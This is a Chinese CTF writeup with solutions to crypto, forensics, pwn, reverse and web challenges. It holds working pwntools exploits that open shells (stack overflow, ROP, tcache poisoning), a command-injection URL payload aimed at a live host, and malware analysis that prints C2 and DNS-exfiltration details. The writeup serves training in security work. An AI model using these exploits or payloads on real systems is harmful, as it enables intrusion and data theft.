---
title: "2026新星杯 Writeup"
ctf: "新星杯"
date: 2026-05-31
categories:
  - crypto
  - misc
  - pwn
  - reverse
  - web
flag_format: "flag{...} / HUBU{...}"
author: "xishu"
---

# 新星杯 Writeup

## Crypto

### 1. Baby LCG Stream

#### Summary

题目使用模数很小的 LCG 生成流密钥。已知连续 6 个 LCG 输出，可以直接由前三项恢复 `a` 和 `c`，再继续生成密钥流异或解密。

#### Solution

LCG 满足：

```text
x_{i+1} = a*x_i + c mod 251
```

因此：

```text
a = (x2 - x1) * (x1 - x0)^(-1) mod 251
c = x1 - a*x0 mod 251
```

完整求解脚本：

```python
import re
from pathlib import Path

M = 251
text = Path("baby-lcg-stream-dist/output.txt").read_text()
leak = list(map(int, re.search(r"leak = \[(.*?)\]", text).group(1).split(",")))
cipher = bytes.fromhex(re.search(r"cipher = ([0-9a-f]+)", text).group(1))

x0, x1, x2 = leak[:3]
a = ((x2 - x1) * pow(x1 - x0, -1, M)) % M
c = (x1 - a * x0) % M

stream = leak[:]
x = stream[-1]
for _ in range(len(cipher)):
    x = (a * x + c) % M
    stream.append(x)

key = stream[6:6 + len(cipher)]
flag = bytes(ci ^ ki for ci, ki in zip(cipher, key))

print(a, c)
print(flag.decode())
```

#### Flag

```text
flag{baby_lcg_is_only_linear_2026}
```

### 2. Baby XOR

#### Summary

题目使用 5 字节循环 XOR。flag 前缀 `flag{` 也是 5 字节，所以可以直接恢复完整 key。

#### Solution

密钥恢复：

```text
key = cipher[:5] xor b"flag{"
```

完整求解脚本：

```python
from itertools import cycle
from pathlib import Path

cipher = bytes.fromhex(Path("baby-xor/cipher.txt").read_text().strip())
known = b"flag{"
key = bytes(c ^ p for c, p in zip(cipher[:5], known))
flag = bytes(c ^ k for c, k in zip(cipher, cycle(key)))

print(key)
print(flag.decode())
```

得到的 key 为：

```text
ctf!!
```

#### Flag

```text
flag{xor_is_the_first_crypto_step}
```

### 3. e 的 e 次方

#### Summary

题目给出 `hint1 = e^e mod n` 和 `hint2 = (e+1)^(e+1) mod n`。利用两式可以通过 gcd 恢复 `n`，再根据 `p` 和 `q` 接近的性质用 Fermat 分解。

#### Solution

因为：

```text
n | (e^e - hint1)
n | ((e+1)^(e+1) - hint2)
```

所以：

```text
n = gcd(e^e - hint1, (e+1)^(e+1) - hint2)
```

完整求解脚本：

```python
from math import gcd, isqrt
from Crypto.Util.number import inverse, long_to_bytes

e = 101
hint1 = 5865679524449764451846872550954041456051842276731269049212767296049187744556389082316307306963969642502948883878485205628076178629981455169446707140190112
hint2 = 9678153802049511876552467434404024173234321916415359882963623572114704626938113009749072951664981857531589980197609213930007855808730542002584630991175967
c = 11430302109361456350756868672190808149279249883843496872361137457507220148159868863703134814460141655196964142654536688947948428680223009565661382902634755

n = gcd(pow(e, e) - hint1, pow(e + 1, e + 1) - hint2)

a = isqrt(n)
if a * a < n:
    a += 1

while True:
    b2 = a * a - n
    b = isqrt(b2)
    if b * b == b2:
        p, q = a - b, a + b
        break
    a += 1

phi = (p - 1) * (q - 1)
d = inverse(e, phi)
flag = long_to_bytes(pow(c, d, n))

print(flag.decode())
```

#### Flag

```text
flag{gcd_then_fermat_needs_a_little_patience}
```

### 4. e 的 e 次方 2

#### Summary

改进版只给一个 `hint = e^e mod n`。但题目保证 `e^e > n`，且实际 `e^e - hint = k*n` 中的 `k` 很小，因此枚举小倍数即可恢复 `n`。

#### Solution

先计算：

```text
T = e^e - hint = k*n
```

枚举小的 `k`，令 `n = T // k`，再利用 `p` 和 `q` 是相邻素数的性质做 Fermat 分解。

完整求解脚本：

```python
from math import isqrt
from Crypto.Util.number import inverse, long_to_bytes
import sympy as sp

e = 59
hint = 10907960928043995260095406971534217311634520206649286353398003487801900330934312373810785936535653835
c = 9880876252098936833325370087144821464631632296337728525860511449077698213155417941295284084354746054

T = pow(e, e) - hint

for k in range(1, 1 << 20):
    if T % k != 0:
        continue

    n = T // k
    if not (320 <= n.bit_length() <= 350):
        continue

    a = isqrt(n)
    if a * a < n:
        a += 1

    b2 = a * a - n
    b = isqrt(b2)
    if b * b != b2:
        continue

    p, q = a - b, a + b
    if p * q == n and sp.isprime(p) and sp.isprime(q):
        phi = (p - 1) * (q - 1)
        d = inverse(e, phi)
        flag = long_to_bytes(pow(c, d, n))
        print(k)
        print(flag.decode())
        break
```

本题找到：

```text
k = 7224
```

#### Flag

```text
flag{e_power_leaks_a_tiny_multiple}
```

### 5. BW Password

#### Summary

题目给出 64 个有限域多项式取值点，其中 10 个点被污染。使用 Berlekamp-Welch 算法恢复原始次数 `< 28` 的多项式系数，再派生流密钥解密。

#### Solution

令错误定位多项式为 `E(x)`，原多项式为 `P(x)`，构造：

```text
Q(x) = P(x) * E(x)
Q(x_i) = y_i * E(x_i)
```

其中 `deg(P) < 28`，错误数为 `10`，所以可以把 `Q` 和 `E` 的系数作为未知量，在 `GF(65537)` 上解线性方程组。恢复后计算 `P = Q / E`。

完整求解脚本：

```python
import ast
import re
from hashlib import sha256
from pathlib import Path

P = 65537
K = 28
ERRORS = 10

text = Path("bw-password/output.txt").read_text()
cipher = bytes.fromhex(re.search(r"ciphertext = ([0-9a-f]+)", text).group(1))
points = ast.literal_eval(text[text.index("points = ") + len("points = "):])

q_count = K + ERRORS
e_count = ERRORS
var_count = q_count + e_count

A = []
b = []
for x, y in points:
    row = []
    xp = 1
    for _ in range(q_count):
        row.append(xp)
        xp = (xp * x) % P

    xp = 1
    for _ in range(e_count):
        row.append((-y * xp) % P)
        xp = (xp * x) % P

    A.append(row)
    b.append((y * pow(x, ERRORS, P)) % P)

mat = [row[:] + [rhs] for row, rhs in zip(A, b)]
rows = len(mat)
cols = var_count
pivots = []
r = 0

for c in range(cols):
    pivot = None
    for i in range(r, rows):
        if mat[i][c] % P:
            pivot = i
            break
    if pivot is None:
        continue

    mat[r], mat[pivot] = mat[pivot], mat[r]
    inv = pow(mat[r][c], -1, P)
    mat[r] = [(v * inv) % P for v in mat[r]]

    for i in range(rows):
        if i != r and mat[i][c] % P:
            f = mat[i][c] % P
            mat[i] = [(mat[i][j] - f * mat[r][j]) % P for j in range(cols + 1)]

    pivots.append(c)
    r += 1

sol = [0] * cols
for i, c in enumerate(pivots):
    sol[c] = mat[i][cols] % P

Q = sol[:q_count]
E = sol[q_count:] + [1]

def trim(poly):
    while len(poly) > 1 and poly[-1] == 0:
        poly.pop()
    return poly

def poly_divmod(a, b):
    a = trim(a[:])
    b = trim(b[:])
    q = [0] * max(1, len(a) - len(b) + 1)
    inv_lc = pow(b[-1], -1, P)

    while len(a) >= len(b) and not (len(a) == 1 and a[0] == 0):
        coeff = a[-1] * inv_lc % P
        shift = len(a) - len(b)
        q[shift] = coeff
        for j in range(len(b)):
            a[shift + j] = (a[shift + j] - coeff * b[j]) % P
        a = trim(a)

    return trim(q), trim(a)

coeffs, rem = poly_divmod(Q, E)
assert rem == [0]
coeffs = (coeffs + [0] * K)[:K]

def key_from_coeffs(coeffs):
    blob = b"".join(c.to_bytes(2, "big") for c in coeffs)
    return sha256(b"BW-PASSWORD/key/" + blob).digest()

def stream(key, length):
    out = bytearray()
    counter = 0
    while len(out) < length:
        out += sha256(b"BW-PASSWORD/stream/" + key + counter.to_bytes(4, "big")).digest()
        counter += 1
    return bytes(out[:length])

key = key_from_coeffs(coeffs)
mask = stream(key, len(cipher))
flag = bytes(a ^ b for a, b in zip(cipher, mask))

print(flag.decode())
```

恢复后验证坏点数量正好为 10，位置为：

```text
1, 15, 23, 31, 37, 40, 43, 53, 54, 62
```

#### Flag

```text
flag{berlekamp_welch_beats_prompt_guessing_2026}
```

### 6. Classical Matrix

#### Summary

题目实际是 Vigenere 加密后再做列置换。根据提示，Vigenere key 是 `HUBU`，列置换 key 藏在标题中，为 `MATRIX`。

#### Solution

加密顺序：

```text
Vigenere -> Columnar Transposition
```

因此解密顺序为：

```text
Columnar Transposition inverse -> remove padding X -> Vigenere inverse
```

完整求解脚本：

```python
from math import ceil
from pathlib import Path

cipher = Path("classical-matrix/cipher.txt").read_text().strip()

def columnar_decrypt(cipher, key):
    cols = len(key)
    rows = ceil(len(cipher) / cols)
    order = sorted(range(cols), key=lambda i: (key[i], i))
    grid = [[""] * cols for _ in range(rows)]

    pos = 0
    for c in order:
        for r in range(rows):
            grid[r][c] = cipher[pos]
            pos += 1

    return "".join("".join(row) for row in grid)

def vigenere_decrypt(text, key):
    out = []
    j = 0
    for ch in text:
        if ch.isalpha():
            base = ord("A") if ch.isupper() else ord("a")
            k = ord(key[j % len(key)].lower()) - ord("a")
            out.append(chr((ord(ch) - base - k) % 26 + base))
            j += 1
        else:
            out.append(ch)
    return "".join(out)

mid = columnar_decrypt(cipher, "MATRIX")
flag = vigenere_decrypt(mid.rstrip("X"), "HUBU")

print(flag)
```

#### Flag

```text
flag{classical_crypto_never_gets_old}
```

## Misc

### Summary

本组题是一个连续剧情型日志取证链：从 SOC 告警、钓鱼邮件、LSASS 凭证、DNS 隧道到最终归因。核心方法是交叉分析日志、静态提取恶意样本配置、解析自定义 dump、重组 DNS 隧道数据，并用前序线索解开最终加密包。

### 第一幕：告警消失

题目给了 `alert_log.csv` 和 `Security_events.xml`。告警日志里有多条可疑事件，但关键点是两份日志对照看。

`alert_log.csv` 中：

```text
2026-05-12 01:32,192.168.1.88,192.168.1.1,RDP连接,成功
```

`Security_events.xml` 中同一时间出现域控登录：

```text
EventID 4624
Computer: DC-01.star.local
TargetUserName: admin
LogonType: 10
IpAddress: 192.168.1.88
```

随后出现账户创建和提权：

```text
2026-05-12T01:38:55 EventID 4720 TargetUserName=svc_backup
2026-05-12T01:40:12 EventID 4732 TargetUserName=svc_backup GroupName=Administrators
2026-05-12T01:48:20 EventID 1102 日志清除
```

所以攻击者 IP 是 `192.168.1.88`，创建的账户是 `svc_backup`。题目要求 `MD5(攻击者IP + 创建的账户名)`：

```python
import hashlib
print(hashlib.md5(b"192.168.1.88svc_backup").hexdigest())
```

Flag:

```text
flag{71b32b8cad417d9b502c92275cffcba2}
```

### 第二幕：钓鱼邮件

证据是 `phishing_email.eml`，附件为 `salary_update.exe`。先从邮件中提取附件：

```python
from email import policy
from email.parser import BytesParser
from pathlib import Path

eml = Path("evidence/phishing_email.eml")
msg = BytesParser(policy=policy.default).parsebytes(eml.read_bytes())

for part in msg.walk():
    if part.get_filename() == "salary_update.exe":
        Path("salary_update.exe").write_bytes(part.get_payload(decode=True))
```

静态看 PE 字符串能发现配置标记：

```text
C2_ADDR
C2_PORT
InternetConnectA
HttpSendRequestA
socket
connect
```

`C2_ADDR` 后的字节为：

```text
d1 d9 d2 ce d1 d6 d8 ce d1 ce d9 d9
```

用 `0xe0` XOR 解密：

```python
enc = bytes.fromhex("d1d9d2ced1d6d8ced1ced9d9")
print(bytes(x ^ 0xe0 for x in enc).decode())
```

得到 C2 IP：

```text
192.168.1.99
```

Flag:

```text
flag{192.168.1.99}
```

### 第三幕：域管黄昏

题目给了自定义格式的 `lsass.dmp` 和 `parse_lsass.py`。解析脚本会输出 22 个凭证，但脚本中还读取了一个没有打印的字段：

```python
is_used = struct.unpack_from("<B", data, offset)[0]
```

这个字段就是“只有一个被人拿走了”的标记。补充打印 `used` 字段后，唯一为 `1` 的账户是：

```text
STARTECH\svc_backup
登录类型: Service
Session: 1120
NTLM: b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0
used=1
```

题目要求 NTLM 哈希前 16 位。

Flag:

```text
flag{b5c6d7e8f9a0b1c2}
```

### 第四幕：DNS 隧道

证据是 `dns_tunnel.pcap`。异常查询名格式为：

```text
0000.<hex>.tunnel.evil.com
...
0067.<hex>.tunnel.evil.com
```

共 68 个，按序号拼接第二段十六进制数据得到密文。密钥提示“前两幕见过”，有效密钥是第一幕攻击者 IP 加第二幕 C2 IP：

```text
192.168.1.88192.168.1.99
```

完整解密脚本：

```python
from pathlib import Path
import struct
import re

pcap = Path("evidence/dns_tunnel.pcap").read_bytes()
endian = "<" if pcap[:4] == b"\xd4\xc3\xb2\xa1" else ">"

def parse_name(data, pos):
    labels = []
    jumped = False
    original = pos
    while True:
        length = data[pos]
        if length & 0xc0 == 0xc0:
            ptr = ((length & 0x3f) << 8) | data[pos + 1]
            if not jumped:
                original = pos + 2
            pos = ptr
            jumped = True
            continue
        pos += 1
        if length == 0:
            break
        labels.append(data[pos:pos + length].decode())
        pos += length
    return ".".join(labels), original if jumped else pos

queries = []
offset = 24
while offset + 16 <= len(pcap):
    _, _, incl_len, _ = struct.unpack(endian + "IIII", pcap[offset:offset + 16])
    offset += 16
    pkt = pcap[offset:offset + incl_len]
    offset += incl_len

    if len(pkt) < 42 or pkt[12:14] != b"\x08\x00":
        continue
    ip = pkt[14:]
    ihl = (ip[0] & 0x0f) * 4
    if ip[9] != 17:
        continue
    udp = ip[ihl:]
    sport, dport, udp_len, _ = struct.unpack("!HHHH", udp[:8])
    if dport != 53:
        continue

    dns = udp[8:8 + udp_len - 8]
    flags = struct.unpack("!H", dns[2:4])[0]
    if flags >> 15:
        continue

    qdcount = struct.unpack("!H", dns[4:6])[0]
    pos = 12
    for _ in range(qdcount):
        qname, pos = parse_name(dns, pos)
        pos += 4
        queries.append(qname)

chunks = {}
pat = re.compile(r"^(\d{4})\.([0-9a-f]+)\.tunnel\.evil\.com$", re.I)
for q in queries:
    m = pat.match(q)
    if m:
        chunks[int(m.group(1))] = m.group(2)

cipher = bytes.fromhex("".join(chunks[i] for i in sorted(chunks)))
key = b"192.168.1.88192.168.1.99"
plain = bytes(c ^ key[i % len(key)] for i, c in enumerate(cipher))
print(plain.decode())
```

明文中出现：

```text
Flag: flag{dns_tunnel_exfil_72h}
```

Flag:

```text
flag{dns_tunnel_exfil_72h}
```

### 第五幕：幽灵画像

证据包括：

```text
investigation_report.md
email_server.log
vpn_access.log
secret.zip
```

报告列出嫌疑人，其中：

```text
S-03 | 李华 | 人力资源 | HR经理 | WS-023
```

邮件日志显示 `lihua@star.com` 在深夜登录，并通过 `hr@star.com` 发出钓鱼邮件：

```text
[2026-05-11 23:08:33] LOGIN user=lihua@star.com ip=10.0.1.103
[2026-05-11 23:12:01] SEND from=hr@star.com to=chenmo@star.com attachment=salary_update.exe
```

第四幕解出的攻击报告也说明真正攻击者来自 HR 部门。页面提示 ZIP 密码由“攻击者身份信息 + 部门 + C2 地址”组成。结合前面线索：

```text
攻击者身份信息: lihua
部门: hr
C2 地址: 192.168.1.99
```

密码为：

```text
lihuahr192.168.1.99
```

用该密码打开 `secret.zip`，`secret.txt` 中给出最终结论：

```text
真正的攻击者是：李华（lihua）
部门：人力资源部（HR）
职位：HR 经理

flag{lihuahr192.168.1.99}
```

Flag:

```text
flag{lihuahr192.168.1.99}
```

### Final Flags

```text
第一幕 flag{71b32b8cad417d9b502c92275cffcba2}
第二幕 flag{192.168.1.99}
第三幕 flag{b5c6d7e8f9a0b1c2}
第四幕 flag{dns_tunnel_exfil_72h}
第五幕 flag{lihuahr192.168.1.99}
```

## Pwn

### 1. easy_overflow

#### 保护与关键点

checksec：No PIE，No Canary，Partial RELRO，栈可执行。

程序里有现成的 win()，内部直接调用 system("/bin/sh")。

vuln() 在栈上开了 0x40 字节缓冲区，却用 read(0, buf, 0x100) 读入数据，明显存在栈溢出。

#### 利用思路

覆盖返回地址即可 ret2win。

偏移为 0x40 + 8 = 72 字节。

这里最好不要直接跳 win()，而是先经过一个单独的 ret gadget（0x40101a）再进 win()。原因是 x64 下直接 ret 进函数会把栈对齐打乱，win() 里再 call system() 时可能因为 16 字节对齐问题崩掉。

因此最终链子是：padding(72) + ret(0x40101a) + win(0x4011fb)。

#### exp
```python
from pwn import *

context.binary = elf = ELF('./1/easy_overflow/pwn1')

p = process(elf.path)

ret = 0x40101a

win = 0x4011fb

payload = b'A' * 72 + p64(ret) + p64(win)

p.sendlineafter(b'Input:\n', payload)

p.interactive()
```
### 2. shellcode_runner

#### 保护与关键点

checksec：No PIE，No Canary，NX Enabled。

虽然栈不可执行，但程序自己调用 mmap(NULL, 0x1000, 7, 0x22, -1, 0) 申请了一页 RWX 内存，然后把用户输入读进去，最后直接 call 过去执行。

同时程序还检查了 shellcode 长度，要求 1 <= len <= 128。

#### 利用思路

既然程序已经帮我们准备好 RWX 页面，并且会主动跳过去执行，那就不需要 ROP，直接发 shellcode 即可。

最省事的写法就是 pwntools 的 shellcraft.sh()。

#### exp
```python
from pwn import *

context.binary = elf = ELF('./2/shellcode_runner/pwn5')

context.arch = 'amd64'

p = process(elf.path)

sc = asm(shellcraft.sh())

p.sendlineafter(b'max 128):\n', str(len(sc)).encode())

p.sendafter(b'Send your shellcode:\n', sc)

p.interactive()
```
### 3. rop_train

#### 保护与关键点

checksec：No PIE，No Canary，NX Enabled。

vuln() 里同样是 0x40 栈缓冲区配合 read(0, buf, 0x100) 的经典栈溢出。

程序没有现成的 win()，但很贴心地准备了几组 gadget：

0x40117e: pop rax; ret

0x40118b: pop rdi; ret

0x401198: pop rsi; ret

0x4011a5: pop rdx; ret

0x4011b2: syscall; ret

此外 .data 段里还放了一个全局字符串 /bin/sh，地址是 0x404028。

#### 利用思路

直接手搓 execve('/bin/sh', 0, 0) 即可。

Linux amd64 下 execve 的系统调用号是 59，所以：rax=59，rdi=/bin/sh，rsi=0，rdx=0，然后 syscall。

栈溢出偏移同样是 72。

#### exp
```python
from pwn import *

context.binary = elf = ELF('./3/rop_train/pwn7')

p = process(elf.path)

pop_rax = 0x40117e

pop_rdi = 0x40118b

pop_rsi = 0x401198

pop_rdx = 0x4011a5

syscall = 0x4011b2

binsh = 0x404028

payload  = b'A' * 72

payload += p64(pop_rax) + p64(59)

payload += p64(pop_rdi) + p64(binsh)

payload += p64(pop_rsi) + p64(0)

payload += p64(pop_rdx) + p64(0)

payload += p64(syscall)

p.sendlineafter(b'Input:\n', payload)

p.interactive()
```
### 4. heap_hook

#### 保护与关键点

checksec：No PIE，No Canary，NX Enabled。

题目是一个最多管理 8 个 chunk 的菜单堆题，提供 add/edit/show/delete。

关键全局变量有三个：chunks[]、sizes[]，以及一个函数指针 hook。

hook 位于 0x602080，程序启动时它的默认值是 bye()，而菜单选项 5 会直接 call hook()。

程序还提供了 win()，地址为 0x400968，内部直接 system('/bin/sh')。

#### 漏洞点

delete() 只是 free(chunks[idx])，但没有把 chunks[idx] 清空，也没有清掉 sizes[idx]。

这意味着释放后还可以继续 edit/show 同一个下标，属于典型 UAF。

题目目录里附带了 glibc 2.27，tcache 存在且没有 safe-linking，因此可以直接做 tcache poisoning。

#### 利用思路

思路是申请两个同尺寸 chunk，按顺序 free 后利用 UAF 改写 tcache 单链表 fd，使下一次分配落到 hook 上。

具体步骤如下：

1. add 两个 0x20 chunk，得到 idx 0 和 idx 1。

2. delete(0)，delete(1)，此时 0x30 tcache 链表头为 chunk1 -> chunk0。

3. 因为 idx 1 仍然保存着已释放 chunk1 的地址，可以 edit(1, p64(0x602080))，把 chunk1 的 fd 改成 hook。

4. 再 add 一个 0x20，会取回 chunk1；再 add 一个 0x20，就会拿到伪造出来的 hook 地址。

5. 向这个“chunk”里写入 p64(0x400968) 覆盖 hook。

6. 选择菜单 5，程序执行 hook()，实际跳到 win()，拿 shell。

#### exp
```python
from pwn import *

context.binary = elf = ELF('./4/heap_hook/pwn8')

p = process(elf.path)

def add(sz, data):

p.sendlineafter(b'choice: ', b'1')

p.sendlineafter(b'size: ', str(sz).encode())

p.sendafter(b'data: ', data)

def edit(idx, data):

p.sendlineafter(b'choice: ', b'2')

p.sendlineafter(b'idx: ', str(idx).encode())

p.sendafter(b'data: ', data)

def delete(idx):

p.sendlineafter(b'choice: ', b'4')

p.sendlineafter(b'idx: ', str(idx).encode())

hook = 0x602080

win  = 0x400968

add(0x20, b'A' * 8)

add(0x20, b'B' * 8)

delete(0)

delete(1)

edit(1, p64(hook))

add(0x20, b'C' * 8)

add(0x20, p64(win))

p.sendlineafter(b'choice: ', b'5')

p.interactive()
```
### 5. hidden_menu

#### 保护与关键点

checksec：No PIE，No Canary，NX Enabled。

表面菜单只有两个选项：1.Login，2.Exit。

但 main() 里除了判断 choice == 1 之外，还额外判断了 choice == 0x539，也就是十进制 1337。

如果输入 1337，就会进入隐藏函数 secret()。

#### 漏洞点与利用思路

secret() 会先让我们输入 Boss Key，然后用 strncmp(input, 'OpenTheDoor', 0xb) 做比较。

比较成功后输出 Welcome Boss!，随后调用 backdoor()。

backdoor() 内部直接 system('/bin/sh')。

所以这题根本不需要打栈溢出，直接走隐藏分支即可。

顺带一提，secret() 里还有一个 read(0, buf, 0x40) 读入到 0x20 栈缓冲区的二次溢出点，但完全没必要用，最短路径就是 1337 + 正确口令。

#### exp
```python
from pwn import *

context.binary = elf = ELF('./5/hidden_menu/pwn9')

p = process(elf.path)

p.sendlineafter(b'2. Exit\n', b'1337')

p.sendlineafter(b'Boss Key:\n', b'OpenTheDoor')

p.interactive()
```
### 6. console_game

#### 保护与关键点

checksec：No PIE，No Canary，NX Enabled。

game() 先展示一个小游戏菜单，然后第一次 read(0, buf, 0x40) 读入“菜单选项”。

如果首字节是字符 '2'，程序会调用 hint()，提示一句 Hint: maybe you can win the game...。

随后程序继续执行，第二次又会提示 Enter your player name:，并用 read(0, name, 0x80) 往 0x40 的栈缓冲区里读数据。这里就是实际的栈溢出点。

程序中同样存在 win()，地址为 0x40121d，内部直接 system('/bin/sh')。

#### 利用思路

第一次输入发 '2' 只是为了走到 hint()，真正利用的是第二次名字输入。

偏移仍然是 72 字节。

和第 1 题一样，这里最好也先补一个 ret（0x40101a）再进 win()，避免 system() 因栈对齐问题崩掉。

因此 payload 为：b'A' * 72 + p64(0x40101a) + p64(0x40121d)。

#### exp
```python
from pwn import *

context.binary = elf = ELF('./6/console_game/pwn10')

p = process(elf.path)

ret = 0x40101a

win = 0x40121d

payload = b'A' * 72 + p64(ret) + p64(win)

p.sendafter(b'1. Play Game\n2. Get Hint\n3. Exit\n', b'2\n')

p.sendafter(b'Enter your player name:\n', payload)

p.interactive()
```

## Reverse

### 密码的 / ru2

#### 分析过程

`ru2.exe` 是 Rust 编译的 PE 程序，字符串里可以直接看到提示语：

```text
Please enter flag:
no you don't know rust ,try again !!!
oh you know rust well ,get flag
```

同时在 `.rdata` 附近能看到几段关键字符串：

```text
isccsecretkey!!!
BKBQWQ_to_Iscc!!
rc4_bkbqwqkey!!!
```

在交叉引用处继续跟进校验逻辑，能看到一段典型 RC4 结构：

- 先初始化 0x100 字节 S 盒；
- 使用 `rc4_bkbqwqkey!!!` 做 KSA；
- 对输入做 PRGA 异或；
- 要求输入长度为 `0x30`；
- 将 RC4 结果和程序内置的 0x30 字节密文比较。

关键反汇编特征如下：

```asm
lea    rax, [rip + ...]      ; "rc4_bkbqwqkey!!!"
...
cmp    rbx, 0x30             ; 输入长度必须为 48
...
xor    r9b, BYTE PTR [rsp+r8+0x4c0] ; RC4 keystream xor input
...
call   memcmp
```

所以解法就是提取内置比较数组，然后用同一个 RC4 key 反解。还原后得到：

```text
flag{w31c0me_t0_I3CC_Y0U_know_ru3t_w4ll!!!}
```

#### Flag

```text
flag{w31c0me_t0_I3CC_Y0U_know_ru3t_w4ll!!!}
```

### ru1

#### 分析过程

`ru1.exe` 同样是 Rust 编译的命令行校验程序。先用字符串定位主逻辑：

```text
Please enter flag:
no you don't know rust well, try again
oh you know rust well ,get flag
error len !!!
```

在提示字符串的交叉引用附近能看到长度检查：

```asm
sub    rcx, rbx
cmp    rcx, 0x2a
jne    fail
```

说明输入长度必须是 `0x2a`，也就是 42 字节。

继续看成功分支前的处理逻辑，核心是逐字节异或：

```asm
movzx  ebp, BYTE PTR [r15]      ; 取输入字符
xor    bpl, BYTE PTR [rdi+rsi]  ; 与表异或
add    rsi, 0x4                 ; 表按 dword 间隔取低字节
...
cmp    output, target, 0x2a
```

因此程序逻辑可以整理为：

```python
for i in range(42):
    out[i] = input[i] ^ key[i * 4]

check(out == target)
```

从栈初始化处提取 `key` 和 `target` 两个数组后，反向计算：

```python
flag[i] = target[i] ^ key[i * 4]
```

还原得到 UUID 风格 flag：

```text
flag{a9f3dcb8-1c27-4c52-9c4f-b5f2d973cc02}
```

#### Flag

```text
flag{a9f3dcb8-1c27-4c52-9c4f-b5f2d973cc02}
```

### baby_re

#### 分析过程

题目给了两个文件：

```text
baby_re.txt
download.dat
```

`baby_re.txt` 实际是一份 CyberChef recipe，正向流程是：

```text
From Base64
AES Encrypt
RC4
DES Encrypt
SM4 Encrypt
```

`download.dat` 是最终密文的十六进制形式，所以解题时按相反顺序还原：

```text
SM4 Decrypt
DES Decrypt
RC4
AES Decrypt
To Base64
```

使用到的参数：

```text
AES-CBC key = 23424342343345fa
AES-CBC iv  = sadwfer34asdaw34
RC4 key     = bkbqwq
DES-CBC key = 343245sd
DES-CBC iv  = 3423sdfs
SM4-CBC key = 33423453453dxdfd
SM4-CBC iv  = dfrgdasdawsdawsf
```

还原脚本：

```python
import base64
from pathlib import Path
from Crypto.Cipher import AES, DES, ARC4
from Crypto.Util.Padding import unpad
from gmssl.sm4 import CryptSM4, SM4_DECRYPT

ct = bytes.fromhex(Path("download.dat").read_text().strip())

sm4 = CryptSM4()
sm4.set_key(b"33423453453dxdfd", SM4_DECRYPT)
x = sm4.crypt_cbc(b"dfrgdasdawsdawsf", ct)

x = unpad(DES.new(b"343245sd", DES.MODE_CBC, b"3423sdfs").decrypt(x), 8)
x = ARC4.new(b"bkbqwq").decrypt(x)
x = unpad(AES.new(b"23424342343345fa", AES.MODE_CBC, b"sadwfer34asdaw34").decrypt(x), 16)

raw = base64.b64encode(x).decode()
print(raw)
print("HUBU{" + raw.removeprefix("HUBU").rstrip("=") + "}")
```

输出的 Base64 文本为：

```text
HUBUshjcaseyfduwegr36487267843287fsakfhskjefeks=
```

题目要求的 flag 格式是 `HUBU{...}`，所以去掉前缀 `HUBU` 和末尾 Base64 padding `=` 后提交。

#### Flag

```text
HUBU{shjcaseyfduwegr36487267843287fsakfhskjefeks}
```

### 木马的

#### 分析过程

题目说明这是恶意样本，所以只做静态分析，没有运行样本。

目录内主要文件：

```text
WinHealthSvc.exe
dllhost.exe
VERSION.dll
diagnostics.dat
runtime.db
vcruntime140.dll
```

先看 `VERSION.dll`，它导出了一组 Version API：

```text
GetFileVersionInfoA
GetFileVersionInfoW
GetFileVersionInfoSizeA
GetFileVersionInfoSizeW
VerQueryValueA
VerQueryValueW
...
```

这说明它很可能是 DLL sideload 的代理 DLL。继续分析 `VERSION.dll`，发现它会读取并解密 `diagnostics.dat`。解密算法是从文件第 1 字节取 seed，后续每字节异或 `(seed + i) & 0xff`：

```python
from pathlib import Path

def decode_file(name):
    data = Path(name).read_bytes()
    seed = data[0]
    dec = bytearray(data[1:])
    for i in range(len(dec)):
        dec[i] ^= (seed + i) & 0xff
    Path(name + ".decoded").write_bytes(dec)

decode_file("diagnostics.dat")
decode_file("runtime.db")
```

`diagnostics.dat` 解密后是 PE payload，里面包含 BYOVD 相关日志：

```text
[byovd] enter load_driver
[byovd] DRIVER_SYS_ENC size =
[byovd] drv MZ check =
[byovd] .sys written to disk OK
[byovd] SCM opened OK
[byovd] service created OK
```

`runtime.db` 使用同样算法解密后也是 PE。搜索网络相关字符串能看到：

```text
153.3.238.127
8080
[PL] C2 target: %s:%s
g_serverIp
g_serverPort
CHANGE_SERVER_IP
```

在代码交叉引用中，`153.3.238.127` 和 `8080` 会一起传入连接逻辑，因此 C2 为：

```text
153.3.238.127:8080
```

接着分析 BYOVD 驱动。`diagnostics.dat.decoded` 中有一段加密的 `.sys`，大小为 `0x4918`，解密逻辑为：

```asm
dst[i] ^= (0x5d + i) & 0xff
```

还原脚本：

```python
from pathlib import Path
import pefile

p = Path("diagnostics.dat.decoded")
data = p.read_bytes()
pe = pefile.PE(str(p))

base = pe.OPTIONAL_HEADER.ImageBase
off = pe.get_offset_from_rva(0x180015769 - base)

drv = bytearray(data[off:off + 0x4918])
for i in range(len(drv)):
    drv[i] ^= (0x5d + i) & 0xff

Path("embedded_byovd.sys").write_bytes(drv)
```

解出的 `embedded_byovd.sys` 是有效 x64 PE 驱动，导入包含：

```text
IoCreateDevice
IoCreateSymbolicLink
RtlInitUnicodeString
```

在驱动字符串中能看到：

```text
\Device\GLCKIo
\DosDevices\GLCKIo
\Device\PhysicalMemory
```

驱动入口附近也能确认它用 `\Device\GLCKIo` 调用 `IoCreateDevice`，然后用 `\DosDevices\GLCKIo` 调用 `IoCreateSymbolicLink`：

```asm
lea    rdx, [rip+...] ; "\Device\GLCKIo"
call   RtlInitUnicodeString
call   IoCreateDevice

lea    rdx, [rip+...] ; "\DosDevices\GLCKIo"
call   RtlInitUnicodeString
call   IoCreateSymbolicLink
```

加载器里还会创建 SCM 服务名，但该名字是运行时动态生成的 `Ene%04X`，其中 `%04X` 来自 `GetTickCount()` 的低位，不是固定提交值。因此题目里的“驱动名”应取内核驱动注册/创建设备时使用的固定名称 `GLCKIo`。

#### Flag

```text
HUBU{153.3.238.127:8080+GLCKIo}
```

## Web

### HIS

漏洞在 /medical-record/preview?file=：预览接口的文件类型检测存在命令注入。

验证 payload：

```
curl "http://116.211.228.232:40074/medical-record/preview?file=record_1.log%3Bid"
```

回显：

```
uid=0(root) gid=0(root) groups=0(root)
```

读环境变量：

```
curl "http://116.211.228.232:40074/medical-record/preview?file=record_1.log%3Benv"
```

flag 在环境变量里：

```
flag{01de9e02-b4e8-415f-8276-f8088e0dc6ef}
```

---

### HUBU2026-你会猛猛蹬吗

#### 保护与关键点

- 文件类型：pcapng 网络抓包文件 + 二进制可执行文件
- Flag 格式：`HUBU{apikey}`
- 关键点：程序运行过程中会调用外部 API，API Key 会明文传输在网络流量中

#### 漏洞点与利用思路

